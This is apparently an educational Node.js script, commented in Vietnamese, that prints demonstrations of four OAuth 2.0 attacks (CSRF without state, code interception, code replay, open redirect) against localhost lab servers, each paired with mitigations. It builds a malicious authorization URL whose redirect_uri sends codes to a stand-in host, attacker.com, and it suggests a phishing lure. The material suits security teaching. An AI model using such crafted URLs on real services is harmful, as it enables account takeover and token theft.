/**
 * ATTACK DEMONSTRATIONS FOR VULNERABLE OAUTH IMPLEMENTATION
 * 
 * Script này demo các cuộc tấn công phổ biến vào OAuth 2.0
 * Chỉ sử dụng cho mục đích học tập và demo!
 */

const axios = require('axios');

console.log('='.repeat(80));
console.log('⚠️  OAUTH 2.0 ATTACK DEMONSTRATION TOOLKIT');
console.log('='.repeat(80));
console.log('');
console.log('📋 Available Attack Scenarios:');
console.log('');
console.log('1. CSRF Attack (No State Parameter)');
console.log('   - Lợi dụng việc không validate state parameter');
console.log('   - Attacker tạo authorization request và trick victim click');
console.log('');
console.log('2. Authorization Code Interception');
console.log('   - Đánh cắp authorization code từ redirect URL');
console.log('   - Sử dụng code để lấy access token');
console.log('');
console.log('3. Code Replay Attack');
console.log('   - Sử dụng lại authorization code đã dùng');
console.log('   - Possible vì server không enforce one-time use');
console.log('');
console.log('4. Open Redirect Attack');
console.log('   - Thay đổi redirect_uri thành malicious URL');
console.log('   - Đánh cắp authorization code');
console.log('');
console.log('='.repeat(80));

const VULNERABLE_AUTH_SERVER = 'http://localhost:3001';
const VULNERABLE_CLIENT = 'http://localhost:3002';

// Attack 1: CSRF Attack Demo
async function demonstrateCSRFAttack() {
    console.log('\n' + '='.repeat(80));
    console.log('🎯 ATTACK 1: CSRF ATTACK (NO STATE PARAMETER)');
    console.log('='.repeat(80));
    
    console.log('\n📝 ATTACK SCENARIO:');
    console.log('   1. Attacker tạo malicious authorization URL');
    console.log('   2. Trick victim click vào URL này');
    console.log('   3. Victim authorize → account được link với attacker');
    console.log('   4. Attacker có thể access account của victim');
    
    console.log('\n🔧 ATTACK STEPS:');
    
    // Step 1: Attacker tạo authorization URL
    const maliciousAuthUrl = new URL(`${VULNERABLE_AUTH_SERVER}/login`);
    maliciousAuthUrl.searchParams.append('client_id', 'client-vulnerable-app');
    maliciousAuthUrl.searchParams.append('redirect_uri', `${VULNERABLE_CLIENT}/callback`);
    maliciousAuthUrl.searchParams.append('response_type', 'code');
    maliciousAuthUrl.searchParams.append('scope', 'profile email');
    // NOTE: Không có state parameter!
    
    console.log('\n   Step 1: Attacker creates malicious authorization URL:');
    console.log(`   ${maliciousAuthUrl.toString()}`);
    
    console.log('\n   Step 2: Attacker sends this URL to victim (via phishing email, social media, etc.)');
    console.log('   Example: "Click here to get free gift! 🎁"');
    
    console.log('\n   Step 3: When victim clicks and authorizes:');
    console.log('   - Victim\'s account gets linked to attacker\'s session');
    console.log('   - Attacker can now access victim\'s data');
    
    console.log('\n✅ MITIGATION:');
    console.log('   - Always use state parameter');
    console.log('   - Validate state on callback');
    console.log('   - State should be cryptographically random and tied to user session');
    
    console.log('\n🔍 HOW TO TEST:');
    console.log('   1. Start vulnerable server: node vulnerable-auth-server.js');
    console.log('   2. Start vulnerable client: node vulnerable-client.js');
    console.log('   3. Open the malicious URL above in browser');
    console.log('   4. Login and authorize');
    console.log('   5. Observe that there is no CSRF protection');
    
    return maliciousAuthUrl.toString();
}

// Attack 2: Authorization Code Interception
async function demonstrateCodeInterception() {
    console.log('\n' + '='.repeat(80));
    console.log('🎯 ATTACK 2: AUTHORIZATION CODE INTERCEPTION');
    console.log('='.repeat(80));
    
    console.log('\n📝 ATTACK SCENARIO:');
    console.log('   1. Victim initiates OAuth flow');
    console.log('   2. Attacker intercepts the redirect URL (via network sniffing, XSS, etc.)');
    console.log('   3. Attacker extracts authorization code from URL');
    console.log('   4. Attacker uses code to get access token');
    
    console.log('\n🔧 SIMULATED ATTACK:');
    
    // Giả sử attacker đã intercept được authorization code
    const interceptedCode = 'INTERCEPTED-AUTH-CODE-123';
    
    console.log(`\n   Intercepted authorization code: ${interceptedCode}`);
    console.log('   (In real scenario, this would be captured from victim\'s redirect)');
    
    console.log('\n   Attacker attempts to exchange code for token:');
    
    const attackPayload = {
        grant_type: 'authorization_code',
        code: interceptedCode,
        redirect_uri: `${VULNERABLE_CLIENT}/callback`,
        client_id: 'client-vulnerable-app',
        client_secret: 'secret-123'
    };
    
    console.log(`   POST ${VULNERABLE_AUTH_SERVER}/token`);
    console.log(`   Payload: ${JSON.stringify(attackPayload, null, 2)}`);
    
    console.log('\n⚠️  VULNERABILITY:');
    console.log('   - Vulnerable server doesn\'t properly validate client credentials');
    console.log('   - Authorization code can be used by anyone who has it');
    console.log('   - No binding between code and client');
    
    console.log('\n✅ MITIGATION:');
    console.log('   - Use PKCE (Proof Key for Code Exchange)');
    console.log('   - Strict client authentication');
    console.log('   - Short-lived authorization codes (< 10 minutes)');
    console.log('   - One-time use enforcement');
    console.log('   - Use HTTPS always');
}

// Attack 3: Code Replay Attack
async function demonstrateCodeReplay() {
    console.log('\n' + '='.repeat(80));
    console.log('🎯 ATTACK 3: AUTHORIZATION CODE REPLAY ATTACK');
    console.log('='.repeat(80));
    
    console.log('\n📝 ATTACK SCENARIO:');
    console.log('   1. Victim completes OAuth flow successfully');
    console.log('   2. Attacker obtains the used authorization code (from logs, history, etc.)');
    console.log('   3. Attacker reuses the same code to get another access token');
    console.log('   4. Multiple access tokens exist for the same authorization');
    
    console.log('\n🔧 ATTACK DEMONSTRATION:');
    
    const usedCode = 'already-used-code-xyz';
    
    console.log(`\n   Previously used authorization code: ${usedCode}`);
    
    console.log('\n   First token exchange (legitimate):');
    console.log(`   POST ${VULNERABLE_AUTH_SERVER}/token`);
    console.log('   Result: ✅ Access token issued');
    
    console.log('\n   Second token exchange (ATTACK):');
    console.log(`   POST ${VULNERABLE_AUTH_SERVER}/token with SAME code`);
    console.log('   Result on VULNERABLE server: ✅ Access token issued AGAIN! ⚠️');
    console.log('   Result on SECURE server: ❌ Error: "code already used"');
    
    console.log('\n⚠️  VULNERABILITY:');
    console.log('   - Authorization codes can be reused multiple times');
    console.log('   - No enforcement of one-time use policy');
    console.log('   - Allows unauthorized access token generation');
    
    console.log('\n✅ MITIGATION:');
    console.log('   - Enforce one-time use of authorization codes');
    console.log('   - Invalidate code immediately after first use');
    console.log('   - Revoke all tokens if code reuse is detected (security breach)');
    console.log('   - Set short expiration time (< 10 minutes)');
}

// Attack 4: Open Redirect Attack
async function demonstrateOpenRedirect() {
    console.log('\n' + '='.repeat(80));
    console.log('🎯 ATTACK 4: OPEN REDIRECT ATTACK');
    console.log('='.repeat(80));
    
    console.log('\n📝 ATTACK SCENARIO:');
    console.log('   1. Attacker crafts authorization URL with malicious redirect_uri');
    console.log('   2. Victim authorizes the request');
    console.log('   3. Authorization code is sent to attacker\'s server');
    console.log('   4. Attacker obtains the code and exchanges for token');
    
    console.log('\n🔧 ATTACK PAYLOAD:');
    
    const maliciousRedirectUrl = new URL(`${VULNERABLE_AUTH_SERVER}/login`);
    maliciousRedirectUrl.searchParams.append('client_id', 'client-vulnerable-app');
    maliciousRedirectUrl.searchParams.append('redirect_uri', 'https://attacker.com/steal-code');
    maliciousRedirectUrl.searchParams.append('response_type', 'code');
    maliciousRedirectUrl.searchParams.append('scope', 'profile email');
    
    console.log(`\n   Malicious authorization URL:`);
    console.log(`   ${maliciousRedirectUrl.toString()}`);
    
    console.log('\n   Expected behavior on VULNERABLE server:');
    console.log('   ❌ Accepts the malicious redirect_uri');
    console.log('   ❌ Redirects user to attacker.com with authorization code');
    console.log('   ❌ Attacker receives: https://attacker.com/steal-code?code=STOLEN-CODE');
    
    console.log('\n   Expected behavior on SECURE server:');
    console.log('   ✅ Validates redirect_uri against whitelist');
    console.log('   ✅ Rejects the request: "Invalid redirect_uri"');
    console.log('   ✅ No code is issued');
    
    console.log('\n⚠️  VULNERABILITY:');
    console.log('   - No validation of redirect_uri parameter');
    console.log('   - Accepts any URL as redirect_uri');
    console.log('   - Allows phishing and code theft');
    
    console.log('\n✅ MITIGATION:');
    console.log('   - Maintain strict whitelist of allowed redirect URIs');
    console.log('   - Exact string matching (no wildcards)');
    console.log('   - Validate redirect_uri on both authorize and token endpoints');
    console.log('   - Never allow redirect_uri to be arbitrary user input');
    
    return maliciousRedirectUrl.toString();
}

// Summary and Comparison
function showSecurityComparison() {
    console.log('\n' + '='.repeat(80));
    console.log('📊 VULNERABLE vs SECURE IMPLEMENTATION COMPARISON');
    console.log('='.repeat(80));
    
    const comparison = [
        {
            feature: 'State Parameter',
            vulnerable: '❌ Not used',
            secure: '✅ Required & validated'
        },
        {
            feature: 'Redirect URI Validation',
            vulnerable: '❌ No validation',
            secure: '✅ Strict whitelist'
        },
        {
            feature: 'Code Reuse Prevention',
            vulnerable: '❌ Codes can be reused',
            secure: '✅ One-time use enforced'
        },
        {
            feature: 'Code Expiration',
            vulnerable: '❌ No expiration',
            secure: '✅ 10-minute TTL'
        },
        {
            feature: 'Client Authentication',
            vulnerable: '❌ Weak verification',
            secure: '✅ Strict verification'
        },
        {
            feature: 'Token Expiration',
            vulnerable: '❌ No expiration',
            secure: '✅ 1-hour expiration'
        },
        {
            feature: 'Token Storage',
            vulnerable: '❌ Plain text',
            secure: '✅ Encrypted (AES-256)'
        },
        {
            feature: 'Audit Logging',
            vulnerable: '❌ Basic logging',
            secure: '✅ Comprehensive audit log'
        }
    ];
    
    console.log('\n');
    console.log('Feature'.padEnd(30) + 'Vulnerable'.padEnd(25) + 'Secure');
    console.log('-'.repeat(80));
    
    comparison.forEach(item => {
        console.log(
            item.feature.padEnd(30) +
            item.vulnerable.padEnd(25) +
            item.secure
        );
    });
    
    console.log('\n');
}

// Main execution
async function main() {
    console.log('\n🚀 Starting OAuth 2.0 Attack Demonstrations...\n');
    
    await demonstrateCSRFAttack();
    await demonstrateCodeInterception();
    await demonstrateCodeReplay();
    await demonstrateOpenRedirect();
    
    showSecurityComparison();
    
    console.log('\n' + '='.repeat(80));
    console.log('📚 TESTING GUIDE');
    console.log('='.repeat(80));
    console.log('\nTo test these attacks:');
    console.log('\n1. VULNERABLE VERSION:');
    console.log('   Terminal 1: node vulnerable-auth-server.js');
    console.log('   Terminal 2: node vulnerable-client.js');
    console.log('   Browser: http://localhost:3002');
    console.log('\n2. SECURE VERSION:');
    console.log('   Terminal 1: node secure-auth-server.js');
    console.log('   Terminal 2: node secure-client.js (update CLIENT_SECRET first!)');
    console.log('   Browser: http://localhost:3004');
    console.log('\n3. TRY ATTACKS:');
    console.log('   - On vulnerable version: Attacks will succeed');
    console.log('   - On secure version: Attacks will be blocked');
    console.log('\n' + '='.repeat(80));
    console.log('✅ Attack demonstrations completed!');
    console.log('='.repeat(80));
}

// Run if executed directly
if (require.main === module) {
    main().catch(console.error);
}

module.exports = {
    demonstrateCSRFAttack,
    demonstrateCodeInterception,
    demonstrateCodeReplay,
    demonstrateOpenRedirect,
    showSecurityComparison
};